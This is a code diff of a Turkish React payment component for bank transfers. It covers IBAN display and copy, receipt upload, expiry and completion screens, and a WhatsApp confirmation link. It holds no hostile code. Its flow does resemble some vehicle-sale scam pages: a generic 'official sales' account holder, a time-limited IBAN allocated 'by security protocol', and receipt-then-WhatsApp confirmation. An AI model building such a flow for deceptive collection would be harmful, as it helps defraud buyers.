-                <div style={{ fontSize: '16px', fontWeight: 700, color: 'var(--c-fg, #0f172a)' }}>
-                  {request.bank_name || 'Garanti BBVA'}
-                </div>
-              </div>
-              <div>
-                <span style={{ fontSize: '11px', textTransform: 'uppercase', color: 'var(--c-fg-muted, #64748b)', fontWeight: 600 }}>Hesap Sahibi</span>
-                <div style={{ fontSize: '16px', fontWeight: 700, color: 'var(--c-fg, #0f172a)' }}>
-                  {request.account_holder || 'Resmi Satış & Tahsilat'}
-                </div>
-              </div>
-              <div>
-                <span style={{ fontSize: '11px', textTransform: 'uppercase', color: 'var(--c-fg-muted, #64748b)', fontWeight: 600 }}>Ödenecek Tutar</span>
-                <div style={{ fontSize: '18px', fontWeight: 800, color: '#10b981' }}>
-                  {request.amount}
-                </div>
-              </div>
             </div>
-
-            {/* IBAN Row */}
-            <div
-              style={{
-                background: 'var(--card-bg, #ffffff)',
-                border: '1px solid var(--c-border, #cbd5e1)',
-                borderRadius: '12px',
-                padding: '12px 16px',
-                display: 'flex',
-                alignItems: 'center',
-                justifyContent: 'space-between',
-                gap: '12px',
-              }}
-            >
-              <div>
-                <span style={{ fontSize: '11px', color: 'var(--c-fg-muted, #64748b)', fontWeight: 600 }}>IBAN Numarası</span>
-                <div style={{ fontFamily: 'var(--font-mono, monospace)', fontWeight: 700, fontSize: '16px', letterSpacing: '0.04em' }}>
-                  {request.iban || 'TR00 0000 0000 0000 0000 0000 00'}
-                </div>
-              </div>
-
-              <button
-                type="button"
-                onClick={() => handleCopyIban(request.iban || '')}
-                style={{
-                  display: 'inline-flex',
-                  alignItems: 'center',
-                  gap: '6px',
-                  padding: '8px 14px',
-                  borderRadius: '8px',
-                  background: copied ? '#10b981' : themeAccent === '#38bdf8' ? '#0284c7' : themeAccent,
-                  color: '#fff',
-                  border: 'none',
-                  fontSize: '12px',
-                  fontWeight: 600,
-                  cursor: 'pointer',
-                  transition: 'all 0.2s ease',
-                }}
-              >
-                {copied ? (
-                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
-                    <polyline points="20 6 9 17 4 12" />
-                  </svg>
-                ) : (
-                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-                    <rect x="9" y="9" width="13" height="13" rx="2" ry="2" />
-                    <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-                  </svg>
-                )}
-                <span>{copied ? 'Kopyalandı' : 'Kopyala'}</span>
-              </button>
-            </div>
-
-            {request.admin_note && (
-              <div style={{ padding: '10px 14px', borderRadius: '10px', background: 'rgba(56, 189, 248, 0.1)', border: '1px solid rgba(56, 189, 248, 0.2)', fontSize: '13px' }}>
-                <strong>Yönetici Notu:</strong> {request.admin_note}
-              </div>
-            )}
           </div>
+        )}
 
-          {/* Receipt Upload section */}
-          <div style={{ marginTop: '24px' }}>
-            <h3 style={{ fontSize: '16px', fontWeight: 700, margin: '0 0 4px 0' }}>Dekont / Fiş Yükleme</h3>
-            <p style={{ fontSize: '12px', color: 'var(--c-fg-muted, #64748b)', margin: 0 }}>
-              Transferi gerçekleştirdikten sonra banka dekontunuzu yükleyiniz.
+        {/* STATE 5: EXPIRED */}
+        {status === 'expired' && (
+          <div className="text-center py-8">
+            <div className="w-14 h-14 rounded-2xl bg-red-50 text-red-600 flex items-center justify-center mx-auto mb-4 border border-red-200">
+              <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
+                <circle cx="12" cy="12" r="10" />
+                <line x1="12" y1="8" x2="12" y2="12" />
+                <line x1="12" y1="16" x2="12.01" y2="16" />
+              </svg>
+            </div>
+            <h3 className="text-lg sm:text-xl font-black text-slate-900 mb-2">Ödeme Süresi Sona Erdi</h3>
+            <p className="text-xs sm:text-sm text-slate-600 max-w-md mx-auto mb-6">
+              Güvenlik protokolü gereği tahsis edilen 10 dakikalık IBAN işlem süresi dolmuştur. Yeni bir ödeme talebi oluşturabilirsiniz.
             </p>
-            <ReceiptUpload
-              requestId={request.id}
-              onUploadSuccess={handleReceiptUploaded}
-            />
-          </div>
-        </div>
-      )}
 
-      {/* STATE 5: EXPIRED */}
-      {status === 'expired' && (
-        <div style={{ textAlign: 'center', padding: '24px 12px' }}>
-          <div
-            style={{
-              width: '64px',
-              height: '64px',
-              borderRadius: '50%',
-              background: 'rgba(239, 68, 68, 0.1)',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              margin: '0 auto 16px auto',
-              color: '#ef4444',
-            }}
-          >
-            <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <circle cx="12" cy="12" r="10" />
-              <line x1="12" y1="8" x2="12" y2="12" />
-              <line x1="12" y1="16" x2="12.01" y2="16" />
-            </svg>
-          </div>
-          <h2 style={{ fontSize: '20px', fontWeight: 700, marginBottom: '8px', color: '#ef4444' }}>
-            Süreniz Doldu
-          </h2>
-          <p style={{ color: 'var(--c-fg-muted, #64748b)', fontSize: '14px', maxWidth: '440px', margin: '0 auto 20px auto', lineHeight: 1.6 }}>
-            Tahsis edilen ödeme süresi sona ermiştir. Güvenlik protokolümüz gereği IBAN bilgileri yenilenmelidir. Lütfen tekrar talep oluşturun.
-          </p>
-
-          <button
-            onClick={handleReset}
-            style={{
-              padding: '12px 24px',
-              borderRadius: '10px',
-              background: themeAccent === '#38bdf8' ? '#0284c7' : themeAccent,
-              color: '#fff',
-              border: 'none',
-              fontWeight: 700,
-              fontSize: '14px',
-              cursor: 'pointer',
-            }}
-          >
-            Yeni Talep Oluştur
-          </button>
-        </div>
-      )}
-
-      {/* STATE 6: DONE */}
-      {status === 'done' && (
-        <div style={{ textAlign: 'center', padding: '24px 12px' }}>
-          <div
-            style={{
-              width: '72px',
-              height: '72px',
-              borderRadius: '50%',
-              background: 'rgba(16, 185, 129, 0.1)',
-              display: 'flex',
-              alignItems: 'center',
-              justifyContent: 'center',
-              margin: '0 auto 16px auto',
-              color: '#10b981',
-            }}
-          >
-            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
-              <path d="M9 12l2 2 4-4" />
-            </svg>
-          </div>
-          <h2 style={{ fontSize: '22px', fontWeight: 700, marginBottom: '8px' }}>
-            Ödemeniz ve Dekontunuz Başarıyla Alındı
-          </h2>
-          <p style={{ color: 'var(--c-fg-muted, #64748b)', fontSize: '14px', maxWidth: '460px', margin: '0 auto 20px auto', lineHeight: 1.6 }}>
-            Dekontunuz onay kuyruğuna alınmıştır. Müşteri temsilcimiz siparişinizi en kısa sürede teslim edecektir.
-          </p>
-
-          <div
-            style={{
-              display: 'inline-flex',
-              flexDirection: 'column',
-              gap: '6px',
-              background: 'var(--c-bg-subtle, #f8fafc)',
-              border: '1px solid var(--c-border, #e2e8f0)',
-              borderRadius: '12px',
-              padding: '12px 20px',
-              fontSize: '13px',
-              marginBottom: '20px',
-              textAlign: 'left',
-            }}
-          >
-            <div><strong>Talep No:</strong> {request?.id}</div>
-            <div><strong>Alıcı:</strong> {request?.user_name} ({request?.user_phone})</div>
-            <div><strong>Tutar:</strong> {request?.amount}</div>
-            {request?.receipt && (
-              <div><strong>Yüklenen Dekont:</strong> {request.receipt.file_name}</div>
-            )}
-          </div>
-
-          <div>
             <button
               onClick={handleReset}
-              style={{
-                padding: '10px 20px',
-                borderRadius: '8px',
-                background: 'transparent',
-                border: '1px solid var(--c-border, #cbd5e1)',
-                color: 'inherit',
-                fontSize: '13px',
-                fontWeight: 600,
-                cursor: 'pointer',
-              }}
+              className="bg-red-600 hover:bg-red-700 text-white font-bold py-3 px-6 rounded-xl text-sm transition"
             >
-              Yeni İşlem Başlat
+              Yeni Talep Oluştur
             </button>
           </div>
-        </div>
-      )}
+        )}
+
+        {/* STATE 6: DONE */}
+        {status === 'done' && (
+          <div className="text-center py-8">
+            <div className="w-16 h-16 rounded-2xl bg-emerald-50 text-emerald-600 flex items-center justify-center mx-auto mb-4 border border-emerald-200 shadow-sm">
+              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z" />
+                <path d="M9 12l2 2 4-4" />
+              </svg>
+            </div>
+            <h3 className="text-xl sm:text-2xl font-black text-slate-900 mb-2">
+              Dekontunuz ve Siparişiniz Alındı
+            </h3>
+            <p className="text-xs sm:text-sm text-slate-600 max-w-md mx-auto mb-6 leading-relaxed">
+              Ödemeniz muhasebe birimimiz tarafından onay kuyruğuna alınmıştır. Araç teslimat ve fatura süreçleri için yetkilimiz sizinle irtibata geçecektir.
+            </p>
+
+            <div className="bg-slate-50 border border-slate-200 rounded-2xl p-4 text-xs text-left max-w-md mx-auto mb-6 space-y-2">
+              <div className="flex justify-between">
+                <span className="text-slate-500">Sipariş Referansı:</span>
+                <span className="font-mono font-bold text-slate-900">{refCode}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-slate-500">Alıcı Adı:</span>
+                <span className="font-bold text-slate-900">{request?.user_name}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-slate-500">Telefon:</span>
+                <span className="font-bold text-slate-900">{request?.user_phone}</span>
+              </div>
+              <div className="flex justify-between">
+                <span className="text-slate-500">Tutar:</span>
+                <span className="font-black text-emerald-600">{request?.amount}</span>
+              </div>
+            </div>
+
+            <div className="flex flex-col sm:flex-row items-center justify-center gap-3">
+              <a
+                href={`https://wa.me/905000000000?text=Merhaba,%20${refCode}%20referansl%C4%B1%20sipari%C5%9Fim%20i%C3%A7in%20dekontumu%20y%C3%BCkledim.`}
+                target="_blank"
+                rel="noopener noreferrer"
+                className="w-full sm:w-auto inline-flex items-center justify-center gap-2 bg-emerald-600 hover:bg-emerald-700 text-white font-bold py-3 px-5 rounded-xl text-xs transition"
+              >
+                <span>WhatsApp ile Onay Durumu Öğren</span>
+              </a>
+              <button
+                onClick={handleReset}
+                className="w-full sm:w-auto py-3 px-5 rounded-xl border border-slate-300 text-slate-700 font-bold text-xs hover:bg-slate-50 transition"
+              >
+                Yeni Sipariş / İşlem
+              </button>
+            </div>
+          </div>
+        )}
+      </div>
     </div>
   );
 }
